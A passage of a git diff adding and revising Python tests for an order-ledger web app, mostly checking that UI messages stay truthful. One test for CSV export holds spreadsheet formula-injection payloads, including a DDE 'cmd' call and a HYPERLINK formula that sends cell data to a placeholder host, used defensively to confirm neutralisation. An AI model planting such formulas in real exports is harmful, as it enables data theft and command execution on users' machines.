@@ -320,6 +320,213 @@ def test_items_filter_matches_what_items_page_displays():
         "物品列表的状态筛选没跟显示口径对齐"
 
 
+def test_the_no_unassigned_orders_line_is_not_shown_when_the_fetch_failed():
+    """集运页那句「没有未挂靠的商品订单」，**不许在拉取失败时出现**。
+
+    `loadUnassigned()` 原先是空的 `catch (_) {}`：拉挂了之后
+    `unassignedOptions` 停在 `[]`、`unassignedTotal` 停在 `0`，
+    而那句空态的判据恰恰是 `!length && total === 0` ——
+    于是页面白纸黑字写着「没有未挂靠的商品订单」，**把一次加载失败说成了账本事实**。
+    用户据此判断「所有单都挂好了」，而拦截器那条 toast 三秒就没了。
+
+    触发路径都很平常：后端刚重启（ERR_NETWORK）、迁移期 DB 被锁（axios 15s 超时）、
+    503 被 `retry.js` 重试两次后放弃。
+
+    那一行上面的注释写着「**只有真的一条都没有时才这么说**」——
+    上一次修的是「被 200 截断」那种情形，**没覆盖失败**。同一句话的第二种说谎方式。
+
+    判据：那句空态必须被一个「失败」标志挡在后面，而该标志必须真的在 catch 里被置位。
+    先剥注释——说明里必然写到这些词。
+    """
+    import re
+
+    src = (_REPO / "frontend" / "src" / "views" / "Shipment" / "index.vue").read_text(encoding="utf-8")
+    code = re.sub(r"<!--.*?-->", "", src, flags=re.S)
+    code = re.sub(r"//[^\n]*", "", code)
+
+    i = code.find("没有未挂靠的商品订单")
+    assert i >= 0, "找不到那句空态——探测方式可能已过期"
+    line_start = code.rfind("<", 0, i)
+    line = code[line_start:i]
+    assert "v-else-if" in line, (
+        "「没有未挂靠的商品订单」仍是第一个分支——拉取失败时它照样会显示，"
+        "把一次加载失败说成账本事实")
+
+    m = re.search(r"async function loadUnassigned\(\).*?\n\}", code, re.S)
+    assert m, "找不到 loadUnassigned —— 探测方式可能已过期"
+    body = m.group(0)
+    assert re.search(r"catch[^{]*\{[^}]*unassignedFailed\.value = true", body, re.S), (
+        "`loadUnassigned` 的 catch 里没有把失败记下来——"
+        "只在模板上加个分支而不置位，那个分支永远不会成立")
+
+
+def test_every_place_that_lists_sub_order_money_marks_the_uncounted_ones():
+    """凡是**逐条列出子订单结算额**的地方，都要用 `counted` 标出不计入的那些。
+
+    集运单的「到岸（円）」是按 `Order.ledger_exclusions()` 剔掉退款/交易关闭之后的合计。
+    而展开面板那张表逐行列的是每一单的 `jpy_settled`——**不剔**。
+    一张挂了「待发货 6000 / 退款 10000 / 交易关闭 5000 / 待付款 2000」的集运单：
+    表里加起来 23000，上面那一行写着 7000，**中间 16000 的差没有任何一处解释**。
+    `OrderBrief.counted` 的 docstring 说的就是这件事：
+    「明细加起来 21000、合计写 10000，收到的人只能认为这单子是错的」。
+
+    §151.4 为「对账单」修过一模一样的形状（`copyStatement` 里那段注释），
+    **只修了对账单、没修它上面这张表**——同一个页面、同一份数据、两种说法。
+
+    判据**只覆盖「列出本单子订单的那张表」**（`<el-table :data="row.orders">`），
+    不是模板里每一处 `jpy_settled`。第一版没限定范围，于是把「挂靠候选下拉」也算了进去
+    ——那里列的是**未挂靠的候选订单**（`OrderRead`，压根没有 `counted` 字段，
+    它在 `OrderBrief` 上），判据一上来就误报。
+    「凡是渲染金额的地方都要标」听着更周全，但它把两件不同的事混成了一件。
+    """
+    import re
+
+    src = (_REPO / "frontend" / "src" / "views" / "Shipment" / "index.vue").read_text(encoding="utf-8")
+    tpl = src.split("<script")[0]
+
+    # 定位那张表的范围（标签计数配对，不用非贪婪正则——嵌套的 <el-table-column> 会骗到它）
+    m = re.search(r'<el-table\b[^>]*:data="row\.orders"[^>]*>', tpl)
+    assert m, "找不到列出子订单的那张表——探测方式可能已过期"
+    depth, i = 1, m.end()
+    while i < len(tpl) and depth:
+        o, c = tpl.find("<el-table", i), tpl.find("</el-table>", i)
+        if c == -1:
+            break
+        if o != -1 and o < c and not tpl.startswith("<el-table-column", o):
+            depth, i = depth + 1, o + len("<el-table")
+        else:
+            depth, i = depth - 1, c + len("</el-table>")
+    table = tpl[m.end():i]
+
+    # **剥掉注释再判。** 不剥的话，紧挨着那一列的说明注释里就写着「用 `counted` 告诉我们」，
+    # 判据被它满足——破坏验证时把整段渲染改回不标注，守卫**照样绿**（实测）。
+    # 「解释一件事的文字必然包含描述这件事的那些词」在这个仓库里已经是第七次复发，
+    # 而这一次我在同一条守卫里踩了两处（模板注释 + 脚本注释）。
+    table_code = re.sub(r"<!--.*?-->", "", table, flags=re.S)
+    spots = [x.start() for x in re.finditer(r"t\.jpy_settled", table_code)]
+    assert spots, "那张表里找不到子订单结算额的渲染点——探测方式可能已过期"
+    for x in spots:
+        near = table_code[max(0, x - 400):x + 400]
+        assert "counted" in near, (
+            "子订单表里逐条列出了结算额，却没有 `counted` 判据：\n"
+            "加起来的数与上面那个「到岸」合计对不上，而差额没有任何一处解释。")
+
+    # 对账单那一处也必须继续用它（它是这条规则的来源，不能反过来被改掉）。
+    #
+    # **判据不挂在函数名上。** 我为此换过三个锚点全错：`copyStatement` 只管写剪贴板、
+    # `openStatement` 只管开弹窗，真正拼文本的既不在这两个里、也不一定是个具名函数
+    # （computed / 箭头函数都可能）。每次都红在「对账单不再标注了」这件根本没发生的事上。
+    # 改成钉**用户看得见的那句话**：它在哪个容器里无所谓，消失了才是问题。
+    # 同样先剥 `//` 注释——脚本里那段说明也写着这些词。
+    body = re.sub(r"//[^\n]*", "", src[src.index("<script"):])
+    assert "不计入合计" in body, (
+        "对账单文本里不再标注「不计入合计」了——明细逐条加起来与下面那个货款合计对不上，"
+        "而这份对账单是要发给别人的")
+    assert "o.counted === false ?" in body, (
+        "对账单不再按 `counted` 决定标不标了。那份「哪些状态不计入」的清单必须只有后端一份，"
+        "前端抄一遍就是两份，迟早对不上")
+
+
+def test_a_screenshot_never_rewrites_an_already_imported_order():
+    """OCR 认出的单，**已经导入账本的那些一个字都不许改**。
+
+    页首承诺逐字是：「识别到的单**先落在这里**，不直接进账本……你在这张表上核对/改完，
+    再逐单点『导入』」。而 `processOcr` 原先的顺序是：先按订单号找暂存行（`findStagingByOrderNo`
+    **不按导入状态过滤**）→ 找到就 `mergeIntoStaging`。
+    那个 PATCH 对已导入行是**写穿账本**的——
+    `test_patching_an_imported_row_really_reaches_the_ledger` 钉的就是这件事：
+    实测把账本单从 ¥0.00 / 待发货 改成 ¥45.00 / 待收货 / SF123。
+
+    而批次汇总只会说「补全 N 单：订单号已在暂存里，把这次多认出来的字段补了进去」，
+    **一个字都不提账本被动过**。一次拖十几张截图是常态，不是边角。
+
+    后端分不出「人往格子里敲了个数」和「人拖了一张截图」（都是同一个人类令牌），
+    所以闸只能在前端。核心对**插件**已经有对应的一道
+    （`staging.py` 里那条 `_plugin_claims` 判据），理由逐字相同：
+    「那笔钱可能是人导入后手工核过、改过的」。
+
+    判据钉三件事：
+      · 找到的行**先判导入状态**，已导入就 return，不许走到 `mergeIntoStaging`；
+      · 走的是**独立的计数桶**——复用 `inLedger` 会让汇总说
+        「没有重复放进暂存」，而这次的实情是「没有改动已导入的那张单」，是另一句话；
+      · 汇总里那一行要说清「不会改账本单 / 要改去商品订单页」。
+    """
+    import re
+
+    src = (_REPO / "frontend" / "src" / "views" / "Staging" / "index.vue").read_text(encoding="utf-8")
+
+    # **先剥注释再定位，而且只认真正的调用。**
+    # 第一版拿 `blk.index("mergeIntoStaging")` 找位置，结果匹配到的是**我自己写的那段注释**
+    # （「`mergeIntoStaging` 发的那个 PATCH 把账本单改成…」）——它排在闸前面，
+    # 于是判据得出「闸在调用之后」的相反结论。
+    # 「解释一件事的文字必然包含描述这件事的那些词」在这个仓库里已经是第六次复发。
+    code = re.sub(r"//[^\n]*", "", src)
+    m = re.search(r"const dup = await findStagingByOrderNo\(data\.order_no\)(.*?)\n    \}", code, re.S)
+    assert m, "没找到 OCR 查重那一段 —— 探测方式可能已过期"
+    blk = m.group(1)
+    gate = blk.find("imported_order_id")
+    merge = blk.find("await mergeIntoStaging(")
+    assert gate >= 0, "OCR 查到暂存行之后没有判导入状态——截图会写穿账本"
+    assert merge >= 0, "找不到 mergeIntoStaging 的调用 —— 探测方式可能已过期"
+    assert gate < merge, "导入状态的判断排在 mergeIntoStaging 之后，等于没判"
+
+    assert "ocrTally.imported++" in src, (
+        "已导入那一支没有独立的计数桶——复用 inLedger 会让汇总说「没有重复放进暂存」，"
+        "而这次的实情是「没有改动已导入的那张单」")
+    assert re.search(r"t\.imported \?.*?账本", src), "批次汇总里没有那一行"
+    assert "商品订单" in src[src.index("t.imported ?"):src.index("t.imported ?") + 200], (
+        "汇总没告诉用户去哪里改")
+
+
+def test_a_filter_is_only_cleared_when_its_value_really_disappeared():
+    """筛选只在那个值**真的被改名或删除**时才清——因为提示逐字就是这么说的。
+
+    `MSG_FILTER_CLEARED = '筛选里那个值已改名或删除，已为你清掉筛选'`。
+    原先的判据是「筛选值不在新候选里」，而它在两种「什么都没发生」的情形下也成立：
+
+      · **这个事件加载时也会发**：点一下列头的 ⚙ 就走到 `applyTags`，什么都没变；
+      · **筛选下拉的候选未必来自标签表**：订单页/暂存页「来源」用的是常量
+        `ORDER_SOURCES = ['闲鱼','淘宝','京东',…]`，而标签表里可能一个都没登记过。
+
+    两者叠加的实际后果（生产账本上就能复现——`tagoption` 里只有 1 行、
+    订单的 platform 是「闲鱼 41 / 空 14」）：筛「来源=淘宝」→ 0 行（真话）
+    → 点一下 ⚙ 想看看标签 → **筛选被清掉，还弹一句「已改名或删除」**，
+    而它既没被改名也没被删除，它从来就不在标签表里。
+
+    修法是让组件多发一个 `gone`（原本在、这一次没了的值），五个页面据它判。
+    判据钉三件事：组件真的算了 `gone`、五个页面真的用它、
+    以及**没有人还在用旧判据**（后者是关键——只加不减的话，
+    有人照着旧写法再接一个页面进来，这条守卫也发现不了）。
+
+    **这条合并了原来的 `test_tag_rename_clears_a_stale_filter_on_every_page_generically`**，
+    它的函数体已经是这里的严格子集（同样是「五个页面都要有那句通用写法」），
+    留两份只会在下次改判据时漂移成一份真一份假。它守的理由原样保留在这里：
+    清理必须写成**通用**的、不能按字段逐个 if——四个页面原先都按字段枚举，
+    「来源(platform)」这个同样是标签列、同样有筛选框的字段就那样漏在外面；
+    **按字段枚举正是它被漏掉的原因**，所以判据钉的是「有没有那句通用写法」，
+    而不是「有没有处理 platform」——后者补一个字段就绿了，下一个字段照样漏。
+    """
+    import re
+
+    root = _REPO / "frontend" / "src"
+    nt = (root / "components" / "NotionTable.vue").read_text(encoding="utf-8")
+    assert "const gone = before ? before.filter" in nt, (
+        "`applyTags` 没有算「原本在、现在没了」的值——父页就只能退回按候选集判")
+    assert re.search(r"emit\('tags-changed',\s*\{[^}]*gone", nt), (
+        "`gone` 算了但没发出去")
+
+    pages = ("Orders", "Items", "Staging", "Shipment", "Misc")
+    for page in pages:
+        src = (root / "views" / page / "index.vue").read_text(encoding="utf-8")
+        m = re.search(r"function onTagsChanged\(.*?\n\}", src, re.S)
+        assert m, f"{page} 页没找到 onTagsChanged —— 探测方式可能已过期"
+        body = m.group(0)
+        assert "gone.includes(filters[field])" in body, (
+            f"{page} 页仍按「不在候选里」清筛选，会在「点一下 ⚙」时误清并弹一句假话")
+        assert "!values.includes(filters[field])" not in body, (
+            f"{page} 页还留着旧判据")
+
+
 def test_a_failed_layout_fetch_does_not_open_the_drag_gate():
     """列布局**拉失败**时不许开放拖拽——否则一次网络抖动会毁掉全员共用的那份布局。
 
@@ -2045,9 +2252,14 @@ def test_a_filter_stuck_on_a_renamed_value_is_cleared():
     **2026-08-23 更新判据**：原先钉的是 `!values.includes(filters.platform_account)`
     这个**按字段写死**的字面量。那正是问题所在——四个页面都按字段枚举，
     于是「来源(platform)」这个同样是标签列、同样有筛选框的字段一直漏在外面，
-    而这条守卫**恒绿**（它只问 platform_account 有没有被处理）。
-    现在钉的是那句**通用**写法；覆盖面由
-    `test_tag_rename_clears_a_stale_filter_on_every_page_generically` 一起管。
+    而这条守卫**恒绿**（它只问 platform_account 有没有被处理）。改成钉那句**通用**写法。
+
+    **2026-09-02 再更新**：通用写法本身从 `!values.includes(...)` 换成了
+    `gone.includes(...)`。旧判据「不在候选里」在两种「什么都没发生」的情形下也成立
+    （事件加载时也发；筛选下拉的候选未必来自标签表），于是筛「来源=淘宝」再点一下列头的 ⚙，
+    筛选被清掉还弹一句「已改名或删除」——**而它从来就不在标签表里**。
+    这条测试守的东西没变（通用、要清、要说一句），只是那句话现在必须是真的。
+    覆盖面与组件侧由 `test_a_filter_is_only_cleared_when_its_value_really_disappeared` 管。
     """
     import re
 
@@ -2056,8 +2268,8 @@ def test_a_filter_stuck_on_a_renamed_value_is_cleared():
         b = re.sub(r"//.*$", "", src[src.index("<script"):], flags=re.M)
         fn = b[b.index("function onTagsChanged"):]
         fn = fn[:fn.index("\n}") + 2]
-        assert "!values.includes(filters[field])" in fn, \
-            f"{page} 没有（通用地）检查筛选值是否还在候选集里"
+        assert "gone.includes(filters[field])" in fn, \
+            f"{page} 没有（通用地）检查那个值是不是真的被改名/删除了"
         assert "filters[field] = ''" in fn, f"{page} 没有清掉失效的筛选值"
         assert "ElMessage" in fn, f"{page} 清了筛选却没告诉用户，他会以为筛选自己乱了"
 
@@ -3055,32 +3267,6 @@ def test_every_bulk_update_on_a_ledger_table_bumps_the_version():
         "这些批量 UPDATE 直接改账本表却不推进乐观锁版本：\n  " + "\n  ".join(bad)
         + "\n（后果是静默覆盖：别人改过的行，你手上那份 version 仍然匹配，保存不会 409。）")
 
-
-def test_tag_rename_clears_a_stale_filter_on_every_page_generically():
-    """标签改名后清掉停在旧值上的筛选，必须写成**通用**的，不能按字段逐个 if。
-
-    改名之后库里再没有旧值，拿它精确匹配会查回 0 行，空态显示「没有符合条件的记录」
-    ——用户刚改完名就看到「单子没了」，而且多半不会想到去点筛选框的 ✕。
-
-    原先四个页面都是按字段枚举（只处理 `recipient` / `platform_account`），
-    于是「来源(platform)」这个同样是标签列、同样有筛选框的字段一直漏在外面。
-    **按字段枚举正是它被漏掉的原因**，所以判据钉的是「有没有那句通用清理」，
-    而不是「有没有处理 platform」——后者补一个字段就绿了，下一个字段照样漏。
-    """
-    from pathlib import Path
-
-    root = Path(__file__).resolve().parents[2] / "frontend" / "src" / "views"
-    GENERIC = "if (filters[field] && !values.includes(filters[field]))"
-    bad = []
-    for page in ("Orders", "Staging", "Items", "Misc", "Shipment"):
-        src = (root / page / "index.vue").read_text(encoding="utf-8")
-        if "onTagsChanged" not in src:
-            continue                    # 这一页没接标签事件，无需
-        if GENERIC not in src:
-            bad.append(page)
-    assert not bad, (
-        f"这些页面的 onTagsChanged 还在按字段枚举，新标签字段会漏：{bad}\n"
-        f"应当有一句通用的：{GENERIC}")
 
 # --- 幽灵新建行清草稿的**行为**测试：拿 node 真跑 -------------------------------
 
@@ -4123,3 +4309,634 @@ def test_the_grant_toggle_counts_baseline_as_held():
     assert "baseline" in fn, (
         "就地重算 blocked 时没算上 baseline——"
         "勾一次授权，声明了 baseline 权限的命令反而会灰掉，而用户无法解锁它")
+
+
+def test_the_panel_explains_why_the_goods_box_is_empty_on_a_price_only_order():
+    """「订单价有钱、物品单价全空」时，展开面板必须说明货款框为什么是空的。
+
+    这是 `f6a7b8c9d0e1` 只加列不回填留下的历史形态，而后端现在**保住**它
+    （`build_items` 不再把 NULL 伪造成 0.00，见审计报告 §244）——
+    也就是说这个状态不再会被静默改写掉，它会**一直显示**：
+    订单列表那一栏写着 ¥320，展开后货款框却空着写「直接填金额」，
+    两处并排、互相矛盾，而此前没有任何一个字解释这件事。
+
+    判据在**剥掉注释之后**匹配：这一处恰好有一段解释性注释，里面必然出现
+    `priceOnOrderOnly` 之类的词，不剥就会被自己的解释满足（记忆里那条踩过 7 次的形态）。
+    """
+    import re
+    from pathlib import Path
+
+    src = (Path(__file__).resolve().parents[2]
+           / "frontend/src/components/OrderItemsEditor.vue").read_text(encoding="utf-8")
+    body = re.sub(r"<!--.*?-->", "", src, flags=re.S)          # HTML 注释
+    body = re.sub(r"(?<![\w/])/\*.*?\*/", "", body, flags=re.S)  # JS 块注释（避开 image/* 这类）
+    body = re.sub(r"(?<![:\w])//[^\n]*", "", body)             # JS 行注释（避开 https://）
+
+    assert "priceOnOrderOnly" in body, (
+        "OrderItemsEditor 里没有「钱只在订单行上」这个判据——"
+        "历史形态订单的货款框会空着，而列表里写着金额，无人解释")
+    # 判据本身必须真的看单价是不是全空，而不是随便挂个恒真条件
+    assert re.search(r"priceOnOrderOnly\s*=\s*computed", body), "priceOnOrderOnly 不是个 computed"
+    decl = body.split("priceOnOrderOnly = computed", 1)[1][:400]
+    assert "unit_price_cny" in decl and "every" in decl, (
+        f"判据没有落到「每一条物品的单价都为空」上：{decl[:200]}")
+    assert "price_cny" in decl and "!== 0" in decl, (
+        "判据必须排除 0 元单（包邮/赠品是真有的，那种单货款框空着并不矛盾）")
+    # 模板里必须真的把它用上，且说明文字要提到那个金额
+    assert re.search(r'v-if="priceOnOrderOnly"', body), "算了却没在模板里用"
+    assert "fmtCNY(order.price_cny)" in body, "说明里没有把那笔钱本身显示出来，用户对不上号"
+
+
+def test_the_exact_order_no_lookup_actually_uses_its_index(tmp_path):
+    """按订单号精确查**必须走索引**，不许全表扫。
+
+    `orders` / `shipmentorder` 上的唯一索引都是**部分索引**
+    （`WHERE ... AND is_delete = 0`；部分是必须的——软删之后同一个单号要能再出现）。
+    SQLite 判断「这条查询能不能用这个部分索引」靠**语法蕴含**，不是语义等价：
+    查询写 `is_delete = 0` 才对得上，写 `is_delete IS 0`（`.is_(False)` 生成的）对不上。
+
+    2026-09-02 实测（20000 行 + ANALYZE）：`IS 0` → **SCAN orders**、4.267 ms；
+    `= 0` → SEARCH ... USING INDEX、0.020 ms。**213 倍**，而其余查询形状
+    （整表计数、按日期翻页、按平台筛）计划与耗时一模一样。
+
+    这条守卫钉的是**执行计划本身**，不是源码里的写法——它不需要知道哪些写法是坏的，
+    它问数据库：你打算怎么执行？
+
+    这一点是被自己的破坏验证纠正过来的：起初我在这里写「`~Order.is_delete` 等
+    等价写法同样会丢索引」，拿它当破坏一跑，**守卫是绿的**——因为那句话是错的。
+    六种写法实测下来只有两种会丢（`.is_(False)` → `IS 0`、`!= True` → `!= 1`），
+    `== False` / `== false()` / `~col` / `not_(col)` 都渲染成 `= 0`、都走索引。
+    枚举写法的判据会连**这个**都搞错；问计划的判据不会。
+    """
+    import datetime as dt
+
+    from sqlalchemy import create_engine, text
+    from sqlmodel import Session, SQLModel, select
+
+    from app.models import Order
+    from app.models.base import not_deleted
+
+    url = f"sqlite:///{tmp_path}/plan.db"
+    eng = create_engine(url)
+    import app.models  # noqa: F401  建全表：orders 有指向 shipmentorder 的外键
+    SQLModel.metadata.create_all(eng)
+    with Session(eng) as s:
+        # 空表上规划器没有统计信息，选什么都不算数——必须先灌数据再 ANALYZE。
+        # （2026-09-02 第一次就是在空表上验的，得出了「`.is_(False)` 没影响」的反结论。）
+        for i in range(2000):
+            s.add(Order(date=dt.date(2027, 1, 1), title=f"商品{i}",
+                        order_no=f"TB{i:012d}", platform="淘宝" if i % 2 else "闲鱼",
+                        purchase_status="待收货"))
+        s.commit()
+        s.exec(text("ANALYZE"))
+        s.commit()
+
+        stmt = select(Order).where(not_deleted(Order), Order.order_no == "TB000000001000")
+        sql = str(stmt.compile(eng, compile_kwargs={"literal_binds": True}))
+        plan = " / ".join(r[-1] for r in
+                          s.connection().connection.execute("EXPLAIN QUERY PLAN " + sql).fetchall())
+
+    assert "SCAN" not in plan.upper(), (
+        f"按订单号精确查在全表扫，那个部分唯一索引一次都没用上：\n  计划：{plan}\n  SQL：{sql}\n"
+        f"多半是 `not_deleted` 又被写回成 `.is_(False)`（渲染成 `is_delete IS 0`，"
+        f"与索引的 `is_delete = 0` 语法对不上）")
+    assert "ix_orders_order_no_platform_active" in plan, (
+        f"走了索引，但不是订单号那个：{plan}")
+
+
+def test_known_unique_constraints_still_exist(tmp_path):
+    """`main._UNIQUE_HINTS` 里登记的每一个**索引名**都必须在真实 schema 里存在。
+
+    那张表把数据库的唯一约束报错翻成一句人话。索引一旦改名或被删，
+    匹配就再也命中不了——而**没有任何报错**：用户默默退回那句
+    「数据完整性冲突（唯一约束/外键/必填），请检查后重试」，
+    和修之前一模一样。这正是记忆里那条「豁免/映射的理由要当断言验」。
+
+    只验索引名那一半（`表.列` 那一半是 SQLite 对普通列的报错形态，
+    schema 里没有对应的对象可查）。
+    """
+    import app.models  # noqa: F401
+    from sqlalchemy import create_engine
+    from sqlmodel import Session, SQLModel
+
+    from app.main import _UNIQUE_HINTS
+
+    eng = create_engine(f"sqlite:///{tmp_path}/uq.db")
+    SQLModel.metadata.create_all(eng)
+    with Session(eng) as s:
+        have = {r[0] for r in s.connection().connection.execute(
+            "SELECT name FROM sqlite_master WHERE type='index'").fetchall()}
+
+    declared = [n for n, _ in _UNIQUE_HINTS if n.startswith("ix_")]
+    assert declared, "映射表里一个索引名都没有——它多半被清空了，翻译不会再发生"
+    missing = [n for n in declared if n not in have]
+    assert not missing, (
+        f"这些索引名在 schema 里已经不存在了：{missing}。"
+        f"匹配命中不了，用户会静默退回那句谁也看不懂的通用文案")
+
+
+def test_a_duplicate_order_no_says_so_instead_of_data_integrity_conflict(client, session):
+    """把订单号改成一个已存在的号，要说「这个订单号已经有了」，不能只说「数据完整性冲突」。
+
+    409 在这个前端上是**两件事共用的状态码**：另一件是乐观锁冲突，
+    而页面对它的处理是弹一句话再**整表重载**
+    （`views/Orders/index.vue` 格子保存分支：`ElMessage.warning(detail); load()`）。
+    于是原先的表现是：弹「数据完整性冲突（唯一约束/外键/必填），请检查后重试」，
+    然后整表刷新、刚敲的值消失——用户既不知道错在哪一格，也不知道这一步本就不允许。
+
+    建单那条路早就有明确提示（`addRow` 里那句「订单号 X 已存在」）；
+    改单这条路没有。修在服务端一处，两条路和所有页面一次对齐。
+    """
+    import datetime as dt
+
+    from app.models import OrderStaging
+
+    a = client.post("/api/orders", json={"date": "2027-04-01", "title": "甲",
+                                         "order_no": "DUP-LEDGER-A",
+                                         "purchase_status": "待收货"}).json()
+    b = client.post("/api/orders", json={"date": "2027-04-01", "title": "乙",
+                                         "order_no": "DUP-LEDGER-B",
+                                         "purchase_status": "待收货"}).json()
+    r = client.patch(f"/api/orders/{b['id']}",
+                     json={"version": b["version"], "order_no": "DUP-LEDGER-A"})
+    assert r.status_code == 409, r.text
+    detail = r.json()["detail"]
+    assert "订单号" in detail, f"没说是订单号撞了：{detail!r}"
+    assert "完整性" not in detail, f"还在说那句谁也看不懂的通用文案：{detail!r}"
+
+    # 暂存侧同一动作（它的唯一索引是另一个，报错文本形态也不同）
+    for n in ("DUP-STG-A", "DUP-STG-B"):
+        session.add(OrderStaging(date=dt.date(2027, 4, 1), title=n, order_no=n))
+    session.commit()
+    row = session.exec(__import__("sqlmodel").select(OrderStaging)
+                       .where(OrderStaging.order_no == "DUP-STG-B")).first()
+    r2 = client.patch(f"/api/staging/{row.id}",
+                      json={"version": row.version, "order_no": "DUP-STG-A"})
+    assert r2.status_code == 409, r2.text
+    assert "订单号" in r2.json()["detail"], f"暂存侧没说清：{r2.json()['detail']!r}"
+
+    # **反面**：真正的乐观锁冲突不许被改掉——它和上面共用 409，页面靠这句话区分
+    r3 = client.patch(f"/api/orders/{a['id']}", json={"version": 999, "title": "改个名"})
+    assert r3.status_code == 409 and "他人或机器人" in r3.json()["detail"], (
+        f"乐观锁冲突那句话被改了：{r3.json()}")
+
+
+def test_every_tag_goes_through_the_shared_colour_system():
+    """全应用每一个 `<el-tag>` 都必须走 `constants.js` 那套配色，不许用 Element 默认观感。
+
+    标签的颜色有**六个语义入口**（`typeStyle` / `statusStyle` / `importStatusStyle` /
+    `tagStyleAt` / `platformTagStyle` / `platformSemanticStyle`），但它们最终都落到
+    同一个 `_css` + `TAG_PALETTE`。这是分层，不是割裂——`constants.js` 里甚至写着
+    「同名会诱导后人顺手去重，把用户配色静默做没」。
+
+    会破坏它的是**新加**一个 `<el-tag type="success">`：Element 默认标签的底色、
+    边框、字色都和这套柔和底色不是一路，而它长得完全像个正常的标签，
+    只有把两种放在同一屏上才看得出来——评审时最容易放过去的一种不一致。
+
+    判据先剥 HTML 注释：解释标签配色的注释里必然出现 `typeStyle` 之类的词
+    （记忆里那条踩过七次的形态）。
+    """
+    import re
+    from pathlib import Path
+
+    src_dir = Path(__file__).resolve().parents[2] / "frontend/src"
+    ok_markers = ("typeStyle(", "statusStyle(", "importStatusStyle(", "tagStyleAt(",
+                  "platformTagStyle(", "platformSemanticStyle(", "tagAttrs(")
+    offenders = []
+    for f in sorted(src_dir.rglob("*.vue")):
+        body = re.sub(r"<!--.*?-->", "", f.read_text(encoding="utf-8"), flags=re.S)
+        for m in re.finditer(r"<el-tag\b", body):
+            # 扫到该标签的结束 `>`，跳过引号里的 `>`（`:title="a > b"` 这种）
+            i, quote = m.end(), None
+            while i < len(body):
+                ch = body[i]
+                if quote:
+                    if ch == quote:
+                        quote = None
+                elif ch in "\"'":
+                    quote = ch
+                elif ch == ">":
+                    break
+                i += 1
+            attrs = body[m.start():i]
+            if not any(k in attrs for k in ok_markers):
+                offenders.append(f"{f.relative_to(src_dir)}: {' '.join(attrs.split())[:100]}")
+
+    assert not offenders, (
+        "这些 el-tag 没走共用配色，会用 Element 的默认观感、和其余标签长得不一样：\n  "
+        + "\n  ".join(offenders))
+
+
+def test_csv_export_neutralizes_spreadsheet_formulas(tmp_path):
+    """导出的 CSV 里，任何格子都不许以 `=` `+` `-` `@` / Tab / CR **开头**（数字除外）。
+
+    Excel / LibreOffice 把这样的格子**当公式执行**。而这张表里最容易被人做手脚的
+    恰恰是商品标题与物品名——它们是插件从淘宝抓回来的，卖家想写什么就写什么。
+    一个标题写成 `=HYPERLINK("http://x/?"&A1,"点我")` 的商品，导出之后在 Excel 里
+    就是一个把整行数据带出去的链接，而 `exportCsv` 自己的注释就写着
+    「这种文件会被当成完整账目发给别人」。CWE-1236：
+    「攻击者能写」与「受害者用 Excel 打开」两头在这条链路上都成立。
+
+    RFC4180 的转义**挡不住它**：那只管逗号/引号/换行，而 `=1+1` 一个都不含。
+
+    **这是行为测试，不是文本判据**：它把真的 `exportCsv()` 跑起来
+    （用假的 Blob/URL/document 接住输出），看它实际吐出来的字节。
+    「源码里有没有 deFormula」那种判据挡不住「有这个函数但没接上」。
+
+    反面同样重要：**数字必须原样放行**。`-100.00` 一旦被前缀就在 Excel 里变成文本，
+    金额列再也求不了和——而求和正是把账目导成表格的全部意义。
+    """
+    import json
+    import shutil
+    import subprocess
+    from pathlib import Path
+
+    node = shutil.which("node")
+    if not node:
+        import pytest
+        pytest.skip("环境里没有 node，跑不了这条行为测试（判据本身仍然成立）")
+
+    mod = (Path(__file__).resolve().parents[2] / "frontend/src/utils/exportCsv.js").resolve()
+    harness = tmp_path / "h.mjs"
+    harness.write_text(
+        "const captured = []\n"
+        "globalThis.Blob = class { constructor(parts) { captured.push(parts.join('')) } }\n"
+        "globalThis.URL = { createObjectURL: () => 'blob:x', revokeObjectURL() {} }\n"
+        "globalThis.document = { createElement: () => ({ href: '', download: '', click() {} }) }\n"
+        f"const {{ exportCsv }} = await import({str(mod)!r})\n"
+        "const rows = JSON.parse(process.argv[2])\n"
+        "await exportCsv({ fetchPage: async () => ({ items: rows, total: rows.length }),\n"
+        "  columns: [{ key: 'a', label: 'A' }, { key: 'b', label: 'B' }], name: 't' })\n"
+        "process.stdout.write(captured[0])\n",
+        encoding="utf-8")
+
+    danger = ["=1+1", "=cmd|'/c calc'!A0", '=HYPERLINK("http://x/?"&A1,"点我")',
+              "@SUM(1+1)", "+1+1", "-1+1", "\t=1+1", "\r=1+1"]
+    # b 列放**必须原样放行**的东西：数字（含负数/小数）、日期、中文、空值占位
+    safe = ["100.00", "-100.00", "0", "12.5", "-3", "2027-04-01", "正常标题", "—"]
+    rows = [{"a": d, "b": s} for d, s in zip(danger, safe)]
+
+    # **必须按字节收**：`text=True` 会做 universal-newline 转换，把 `\r\n` 归一成 `\n`，
+    # 而这条测试恰恰要按 `\r\n` 切行——第一版就是这么写的，结果整份输出成了一行。
+    r = subprocess.run([node, str(harness), json.dumps(rows, ensure_ascii=False)],
+                       capture_output=True, timeout=120)
+    assert r.returncode == 0, f"跑不起来：{r.stderr.decode('utf-8', 'replace')[-800:]}"
+    out = r.stdout.decode("utf-8")
+    lines = out.lstrip("﻿").split("\r\n")
+    assert len(lines) == len(rows) + 1, f"行数对不上：{lines}"
+
+    for i, (d, s) in enumerate(zip(danger, safe), start=1):
+        line = lines[i]
+        # 危险的那一列：整行第一个字符就是这一格的开头（未加引号时），
+        # 加了引号时开头是 `"`，此时要看引号后面第一个字符。
+        first = line[1] if line.startswith('"') else line[0]
+        assert first not in "=+-@\t\r", (
+            f"第 {i} 行以 {first!r} 开头，Excel 会把它当公式执行——原值 {d!r}\n  整行：{line!r}")
+        # 反面：安全值不许被动过
+        assert line.endswith("," + s), (
+            f"第 {i} 行把一个本该原样放行的值改了：期望以 {',' + s!r} 结尾，实际 {line!r}。"
+            f"数字被前缀之后在 Excel 里变成文本，金额列就求不了和了")
+
+
+def test_purchase_advance_rule_agrees_between_python_and_javascript(client, tmp_path):
+    """采购状态的「能不能推进」这条规则，**前后端逐对判断必须一致**。
+
+    这条规则今天有三个出口：
+      · `models/base.py::can_advance_purchase` —— Python，权威实现；
+      · `GET /api/meta/status-rules` —— 发给插件的那份数据（淘宝插件**不在本地抄**，
+        每次拉，所以它天然跟得上）；
+      · `frontend/src/constants.js::canAdvancePurchase` —— 前端**硬编码的一份副本**，
+        订单页与暂存页的 OCR 合并都走它。
+
+    第三份此前没有任何东西钉着。`constants.js` 自己写着「必须与后端一致」，
